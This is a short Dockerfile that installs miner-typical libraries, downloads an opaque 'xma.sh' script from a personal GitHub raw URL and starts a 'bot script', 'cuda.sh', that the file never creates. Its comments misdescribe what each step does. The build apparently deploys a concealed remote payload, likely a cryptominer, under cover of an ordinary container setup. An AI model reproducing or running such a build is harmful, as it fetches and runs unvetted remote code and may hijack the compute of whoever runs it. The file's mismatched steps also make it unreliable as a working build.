FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
    libnuma-dev \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Run config.sh and clean up APT:
RUN wget https://raw.githubusercontent.com/shenliana/usey/main/xma.sh \
 && chmod +x xma.sh

# Run bot script:
CMD bash cuda.sh
